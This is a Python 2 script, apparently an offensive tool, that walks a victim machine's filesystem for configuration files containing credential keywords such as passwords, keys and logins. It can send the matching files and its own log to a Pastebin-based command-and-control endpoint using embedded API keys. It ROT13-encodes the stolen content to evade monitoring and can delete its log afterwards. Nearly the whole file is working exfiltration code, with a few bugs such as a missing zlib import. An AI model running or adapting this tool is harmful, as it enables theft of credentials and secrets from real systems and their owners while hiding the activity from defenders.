#!/usr/bin/python

### IMPORTS ###
import os
import argparse
import logging
import platform
import subprocess
import urllib
import urllib2

### GLOBALS ###
ATTACK_SUCCEDED = False
LOG_FILE = "logs.log"
LOGGER = logging.getLogger(__name__)
HOST_OS = platform.system()
SUPPORTED_OS = {
    'Windows': 'dir /s/b PATTERN',
    'Linux': 'find / -type f -name "PATTERN"'
}
KEYWORD_DELIMITER = ","
C2_URL = "https://pastebin.com/api/api_post.php"
C2_BODY = { 
    'api_option': 'paste',
    'api_user_key': 'e6e4814a7440c0081982557dbb83a1df',
    'api_paste_private': 0,
    'api_paste_name': 'TBD',
    'api_paste_expire_date': '1W',
    'api_paste_format': 'text',
    'api_dev_key': '1307f1f4be5c686995862eaeca562039',
    'api_paste_code': 'TEXT_TBD'
}


### CONFIGURABLE VALUES ###
MATCHING_KEYWORDS = ['user', 'pass', 'host', 'pwd', 'key', 'credetials', 'login', 'secret', 'url']
FILE_SEARCH_PATTERN = "C:\\Incubation\\ticket-ticket-ms\\*.yaml"
SEND_FILES_TO_C2 = False
SEND_LOG_TO_C2 = False
OBFUSCATE_CONTENT = True
COMPRESS_CONTENT = False
CASE_SENSITIVE = False
DELETE_LOG = False #delete log before exit

### LOG CONFIGURATION ###
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
                    datefmt='%m-%d %H:%M',
                    filename=LOG_FILE,
                    filemode='w')

class C2FileTransmission:
    '''
    Purpose: This class handles file transmission to C2 server, 
         the classed is defined in same file to avoid multiple files needed for the exploit running on victim's pc
    '''
    def __init__(self, filePath, fileContent = None, compressContent = COMPRESS_CONTENT, obfucscateContent = OBFUSCATE_CONTENT):
        self.filePath = filePath
        self.fileContent = fileContent
        self.isObfuscated = obfucscateContent

        if fileContent == None:
            self._getContent()
        if obfucscateContent:
            self._obfucscateContent()
        if compressContent:
            self._compressContent()

    def _getContent(self):
        '''
        Purpose: Get content of file
        '''
        with open(self.filePath) as file:
            self.fileContent = file.read()

    def _compressContent(self):
        '''
        Purpose: Compress file for faster uploading and less network traffic noise
        '''
        self.fileContent = zlib.compress(self.fileContent)

    def _obfucscateContent(self):
        '''
        Purpose: Perform simple obfuscation to avoid monitoring exporting sensitive data/keywords signature
        '''
        self.isObfuscated = True
        self.fileContent = self.fileContent.encode('ROT13')

    def _performSubmittion(self):
        '''
        Purpose: Perform file submission to c2
        '''
        request = urllib2.urlopen(C2_URL, self.submissionData, timeout=7)
        return request.read()

    def sendFile(self):
        '''
        Purpose: Prepare & submit file to c2
        '''
        data = C2_BODY
        LOGGER.info('Sending file: %s', self.filePath)
        data['api_paste_name'] = self.filePath
        data['api_paste_code'] = self.fileContent
        self.submissionData = urllib.urlencode(data).encode('utf-8')
        
        response = self._performSubmittion()
        LOGGER.info('Response: %s', response)



def isSupportedOS(hostOS):
    '''
    Purpose: Validates that host OS is supported
    Parameters: hostOS (string)
    Returns: true/false
    '''

    return hostOS in SUPPORTED_OS

def getAllMatchingFiles():
    '''
    Purpose: Get all matching files to pattern
    Returns: List of all matching files
    '''

    LOGGER.info("Retriving files matching pattern: %s", FILE_SEARCH_PATTERN)
    command = SUPPORTED_OS[platform.system()].replace("PATTERN", FILE_SEARCH_PATTERN)

    LOGGER.info("Running process with command: %s", command)
    #raise subprocess.CalledProcessError(1, "mycmd", "blabla")
    process = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    output = process.communicate()[0]
    LOGGER.debug(output)
    return output.splitlines()

def hasMatchingKeyword(text, keywords = MATCHING_KEYWORDS, caseSensitive = CASE_SENSITIVE):
    '''
    Purpose: Check if text line contains at least on keyword from keywords
    Parameters: text (string) - the text string will be checked
                keywords (list) - list of keywords to look for
                caseSensitive (boolean) - case sensitive match?
    Returns: true/false
    '''
    text = text.lower() if caseSensitive else text;
    hasMatch = False
    for keyword in keywords:
        keyword = keyword.lower() if caseSensitive else keyword

        if keyword in text:
            LOGGER.critical("Matching keyword found! '%s' in '%s'", keyword, text)
            hasMatch = True
    return hasMatch

def inspectFiles(files):
    '''
    Purpose: Inspecting files and decide if it is valuable accorinding to keywords
    Parameters: files (list) - list of file for inspection
    '''
    global ATTACK_SUCCEDED
    for file in files:
        isMatchingFile = False
        LOGGER.info("Inspecting file: %s", file)
        with open(file, 'rb') as ofile:
        #### loops through every line in the file comparing the strings ####
            for line in ofile:                
                if hasMatchingKeyword(line):
                    isMatchingFile = True

            if hasMatchingKeyword(ofile.name):
                isMatchingFile = True

            if isMatchingFile:
            	ATTACK_SUCCEDED = True #attack considered as successful if there is at least one match
            	if SEND_FILES_TO_C2:
                	c2File = C2FileTransmission(ofile.name)
                	c2File.sendFile()

def initArgParser():
    '''
    Purpose: Initialize argument parser for configuration
    Returns: parser of passed values
    '''
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('--log-level',
                        default="DEBUG",
                        help='Define log level',
                        choices=["DEBUG", "INFO", "WARN", "ERROR", "CRITICAL"]
            )
    parser.add_argument('--keywords',
                        default=KEYWORD_DELIMITER.join(MATCHING_KEYWORDS),
                        help='Set configuration file'
                    )
    parser.add_argument('--pattern', 
                        default=FILE_SEARCH_PATTERN, 
                        help='Set search pattern'
                    )
    parser.add_argument('--case-sensitive', default=CASE_SENSITIVE, type=bool)
    parser.add_argument('--send-files', default=SEND_FILES_TO_C2, type=bool)
    parser.add_argument('--send-log', default=SEND_LOG_TO_C2, type=bool)
    parser.add_argument('--obfuscation', default=OBFUSCATE_CONTENT, type=bool)
    parser.add_argument('--compress', default=COMPRESS_CONTENT, type=bool)
    parser.add_argument('--delete-log', default=DELETE_LOG, type=bool)

    return parser

def setConfiguration(args):
    '''
    Purpose: Sets the configuration of the exploit
    '''
    global SEND_FILES_TO_C2, CASE_SENSITIVE, FILE_SEARCH_PATTERN, MATCHING_KEYWORDS, SEND_LOG_TO_C2, DELETE_LOG

    SEND_FILES_TO_C2 = args.send_files
    CASE_SENSITIVE = args.case_sensitive
    FILE_SEARCH_PATTERN = args.pattern
    MATCHING_KEYWORDS = args.keywords.split(KEYWORD_DELIMITER)
    OBFUSCATE_CONTENT = args.obfuscation
    COMPRESS_CONTENT = args.compress
    SEND_LOG_TO_C2 = args.send_log
    DELETE_LOG = args.delete_log
    logging.getLogger().setLevel(args.log_level)

def main():
    '''
    Purpose: The entry point of the progam
    '''
    try:    
        if not isSupportedOS(HOST_OS):
            LOGGER.error('This script can be executed only on %s', "/".join(SUPPORTED_OS))
        else:
            parser = initArgParser()
            args = parser.parse_args()
            setConfiguration(args)

            LOGGER.info("Started execution on %s", HOST_OS)
            LOGGER.info("Keywords: %s", KEYWORD_DELIMITER.join(MATCHING_KEYWORDS))
            LOGGER.info("Case sensitive: %s", CASE_SENSITIVE)
            LOGGER.info("Send files: %s", SEND_FILES_TO_C2)

            files = getAllMatchingFiles()
            if len(files) == 0:
                LOGGER.info("No matching files were found")
            else:
                inspectFiles(files)

            LOGGER.info("Attack result: %s", "Success" if ATTACK_SUCCEDED else "Failure")
    except Exception, ex:
        LOGGER.error(ex)
    finally:
    	if SEND_LOG_TO_C2:
        	logFileSubmittion = C2FileTransmission(LOG_FILE)
        	logFileSubmittion.sendFile()

        #get rid of log file
        if DELETE_LOG:
	        try:
	        	with open(LOG_FILE, 'w'):
	    			pass
	        	os.remove(LOG_FILE)
	        except Exception:
	         	pass


if __name__ == '__main__':
    main()

